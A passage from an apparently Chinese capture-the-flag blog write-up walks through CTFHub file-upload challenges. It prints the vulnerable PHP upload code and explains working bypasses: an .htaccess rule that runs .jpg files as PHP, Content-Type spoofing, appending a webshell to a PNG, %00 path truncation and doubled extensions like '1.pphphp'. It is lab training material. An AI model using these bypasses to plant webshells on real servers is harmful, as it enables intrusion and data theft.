class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;文件类型不匹配&#x27;)&lt;/script&gt;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在后端把一些常见的木马后缀全部ban掉了，而且因为是后端验证，前端怎么改也没用。</p><p>这里就需要用到<code>.htaccess</code>，它是apcache中的配置文件。我们可以利用它实现把<code>.jpg</code>格式的文件拥有php脚本的能力。</p><p>一般有两种写法。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">AddType application/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">&lt;FilesMatch &quot;.jpg&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>所以只要先长传一个后缀在黑名单之外的<code>.htaccess</code>文件，让<code>.jpg</code>拥有也可以变为php脚本 ，再上传一个内部写有一句话木马的<code>1.jpg</code>，就能够挂马了。</p><p><img src="https://upyun.wuuconix.link/image-20210901124305770.png" alt="antsword" /></p><p><img src="https://upyun.wuuconix.link/image-20210901124349948.png" alt="flag" /></p><h3 id="mime绕过"><a class="markdownIt-Anchor" href="#mime绕过"></a> MIME绕过</h3><p>MIME是什么呢？上一篇<code>.htaccess</code>中出现的<code>application/x-httpd-php</code>其实就属于MIME的一种未被官方承认的类型。</p><p>MIME：<strong>M</strong>ultipurpose <strong>I</strong>nternet <strong>M</strong>ail <strong>E</strong>xtensions 中文专业名称为多用途互联网邮件扩展。</p><p>原来的邮件只支持7位ASCII字符集以内的字符，而MIME的提出则支持了其他的字符，甚至支持了图像、视频、音频等二进制文件。</p><p><img src="https://upyun.wuuconix.link/image-20210902102425660.png" alt="Content-Type" /></p><p>我们在http请求报文中看到的<code>Content-Type</code>字段就是用来提供发送文件的MIME类型的。以下列出常用的MIME类型。</p><ul><li>text/plain（<a href="https://zh.wikipedia.org/wiki/%E7%BA%AF%E6%96%87%E6%9C%AC">纯文本</a>）</li><li>text/html（HTML文档）</li><li>application/xhtml+xml（XHTML文档）</li><li>image/gif（GIF图像）</li><li>image/jpeg（JPEG图像）【PHP中为：image/pjpeg】</li><li>image/png（PNG图像）【PHP中为：image/x-png】</li><li>video/mpeg（MPEG动画）</li><li>application/octet-stream（任意的二进制数据）</li><li>application/pdf（PDF文档）</li><li>application/msword（Microsoft Word文件）</li><li>application/vnd.wap.xhtml+xml (wap1.0+)</li><li>application/xhtml+xml (wap2.0+)</li><li>message/rfc822（RFC 822形式）</li><li>multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）</li><li>application/x-www-form-urlencoded（使用HTTP的POST方法提交的表单）</li><li>multipart/form-data（同上，但主要用于表单提交时伴随文件上传的场合）</li></ul><blockquote><p>此外，尚未被接受为正式数据类型的subtype，可以使用x-开始的独立名称（例如application/x-gzip）。vnd-开始的固有名称也可以使用（例：application/vnd.ms-excel）</p></blockquote><p>​在这道题里就是对文件的Content-Type类型做了限制，而没有对后缀名做任何限制。题目php源代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//设置上传目录</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&quot;/upload/&quot;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_URL_PATH&quot;</span>, <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, UPLOAD_PATH));<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(UPLOAD_PATH, <span class="hljs-number">0755</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>], [<span class="hljs-string">&quot;image/jpeg&quot;</span>, <span class="hljs-string">&quot;image/png&quot;</span>, <span class="hljs-string">&quot;image/gif&quot;</span>, <span class="hljs-string">&quot;image/jpg&quot;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;文件类型不正确&#x27;)&lt;/script&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="hljs-variable">$name</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件相对路径&lt;br&gt;&quot;</span> . UPLOAD_URL_PATH . <span class="hljs-variable">$name</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>所以我们只需要传一个<code>1.php</code>，然后发送的时候用burp把Content-Type改成其中一个就行啦！</p><p><img src="https://upyun.wuuconix.link/image-20210902102752028.png" alt="burp修改Content-Type成功上传" /></p><p><img src="https://upyun.wuuconix.link/image-20210902102846823.png" alt="antsword flag" /></p><h3 id="文件头检查"><a class="markdownIt-Anchor" href="#文件头检查"></a> 文件头检查</h3><p>听题目就可以看出来后台对文件的文件头做了检测。只支持图片。</p><p>我做题的姿势非常骚气。</p><p>首先利用python的<code>pillow</code>模块生成了一个1*1像素的png文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>), <span class="hljs-string">&quot;png&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span> (<span class="hljs-string">&quot;red.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    img.save(f)<br></code></pre></td></tr></table></figure><p>然后上传，顺便用Burp拦截。</p><p>这是原始请求头。</p><p><img src="https://upyun.wuuconix.link/image-20210902123521878.png" alt="原始请求头" /></p><p>图中乱码的部分应该就是二进制图片的内容。这时我们我们先把文件名改成<code>red.php</code>，再在图片二进制内容的后面加上一句话木马。</p><p><img src="https://upyun.wuuconix.link/image-20210902123805567.png" alt="修改后" /></p><p>然后就能直接蚁剑连接了。顺便把它的源码偷过来以后用2333。</p><p><img src="https://upyun.wuuconix.link/image-20210902123934400.png" alt="antsword" /></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//设置上传目录</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&quot;/upload/&quot;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_URL_PATH&quot;</span>, <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, UPLOAD_PATH));<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(UPLOAD_PATH, <span class="hljs-number">0755</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;请添加上传文件&#x27;)&lt;/script&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&quot;rb&quot;</span>);<br>        <span class="hljs-variable">$bin</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$file</span>, <span class="hljs-number">4</span>);<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>], [<span class="hljs-string">&quot;image/jpeg&quot;</span>, <span class="hljs-string">&quot;image/jpg&quot;</span>, <span class="hljs-string">&quot;image/png&quot;</span>, <span class="hljs-string">&quot;image/gif&quot;</span>])) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;文件类型不正确, 只允许上传 jpeg jpg png gif 类型的文件&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$bin</span>), [<span class="hljs-string">&quot;89504E47&quot;</span>, <span class="hljs-string">&quot;FFD8FFE0&quot;</span>, <span class="hljs-string">&quot;47494638&quot;</span>])) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;文件错误&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="hljs-variable">$name</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件相对路径&lt;br&gt;&quot;</span> . UPLOAD_URL_PATH . <span class="hljs-variable">$name</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;CTFHub 文件上传 - 文件头检测&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1&gt;CTFHub 文件上传 - 文件头检测&lt;/h1&gt;<br>    &lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;Filename:&lt;/label&gt;<br>        &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;file&quot;</span> /&gt;<br>        &lt;br /&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;<br>    &lt;/form&gt;<br>    &lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="00截断"><a class="markdownIt-Anchor" href="#00截断"></a> 00截断</h3><p>00截断真的十分玄学。</p><p>首先我们来看一下这道题的源码。注：服务器的php版本为5.2.17, magic_quotes_gpc为off状态。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//设置上传目录</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&quot;/upload/&quot;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_URL_PATH&quot;</span>, <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, UPLOAD_PATH));<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(UPLOAD_PATH, <span class="hljs-number">0755</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>    <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$name</span>);<br>    <span class="hljs-variable">$ext</span> = <span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;extension&#x27;</span>];<br>    <span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>        <span class="hljs-variable">$des</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;road&#x27;</span>] . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>) . <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>) . <span class="hljs-string">&quot;.&quot;</span> . <span class="hljs-variable">$ext</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$des</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件类型不匹配&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;CTFHub 文件上传 - <span class="hljs-number">00</span>截断&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1&gt;CTFHub 文件上传 - <span class="hljs-number">00</span>截断&lt;/h1&gt;<br>    &lt;form action=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;?road=&quot;</span> . UPLOAD_PATH; <span class="hljs-meta">?&gt;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;Filename:&lt;/label&gt;<br>        &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;file&quot;</span> /&gt;<br>        &lt;br /&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;<br>    &lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>它首先对上传的文件的后缀进行检测，只能是三个图片文件格式。</p><p>此外对文件进行存储的时候对文件名进行重命名，在保留原后缀名的情况下把文件名淦成随机的，首先在<code>10-99</code>里选一个数，再加上上传时间，这个上传时间还精确到毫秒2333，十分变态。上传了一个文件你甚至都不知道它的路径，十分绝望。</p><p>存储的路径是这样组成的<code>$des = $_GET['road'] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</code>。其中的<code>road</code>是页面自动发送的，默认值是<code>/var/www/html/upload/</code>。</p><p>这里我们可以利用远古php版本有的一个00截断，手动把这个road参数改成</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/u</span>pload/<span class="hljs-number">1</span>.php%<span class="hljs-number">00</span>.jpg<br></code></pre></td></tr></table></figure><p>改动这个road参数不会对文件上传这个过程产生影响。</p><p>服务器那边接受到的文件还是为<code>1.php%00.jpg</code>，服务器一检查后缀，哦，是.jpg，在白名单内，接下去进行存储。</p><p>按理说存储的路径应该是<code>upload/1.php%00.jpg/5020210902203850.jpg</code>。</p><p>但是%00之后的所有东西都被截断了，那些随机数和时间全部失效，最终存储的文件就变成了<code>upload/1.php</code></p><p><img src="https://upyun.wuuconix.link/image-20210902192907683.png" alt="payload" /></p><p><img src="https://upyun.wuuconix.link/image-20210902192936182.png" alt="antsword" /></p><p><img src="https://upyun.wuuconix.link/image-20210902192949094.png" alt="flag" /></p><p>这个00截取和我一开始想象的不一样。我以为在上传过程中会直接%00后面字符全部丢掉，服务接收到的只是%00之前的内容。</p><p>但是其实不是，服务器会原样的接收该文件，只是在某些操作下，%00后面的字符会失效，但这些操作都有哪些，还不得而知。</p><p>试了好多php镜像，都无法复现。以后再说吧。</p><h3 id="双写后缀"><a class="markdownIt-Anchor" href="#双写后缀"></a> 双写后缀</h3><p>这道题就比00截断简单多了，我们先看一下题目给我们的提示。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>, <span class="hljs-string">&quot;ini&quot;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$blacklist</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$name</span>);<br></code></pre></td></tr></table></figure><p>显然，它对我们上传的文件名中的特定字符进行了替换，但是这种替换实际上是不安全的，双拼即可绕过。例子如下。</p><p><img src="https://upyun.wuuconix.link/image-20210903114145987.png" alt="双拼绕过例子" /></p><p>所以我们只要上传一个<code>1.pphphp</code>。经过它的处理后就变成了<code>1.php</code>。</p><p><img src="https://upyun.wuuconix.link/image-20210903114431095.png" alt="1.php成功上传" /></p><p>然后蚁剑连接即可。</p><p><img src="https://upyun.wuuconix.link/image-20210903114355589.png" alt="flag" /></p><p>顺便把它的源码偷下来以后用2333。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//设置上传目录</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&quot;/upload/&quot;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_URL_PATH&quot;</span>, <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, UPLOAD_PATH));<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(UPLOAD_PATH, <span class="hljs-number">0755</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span 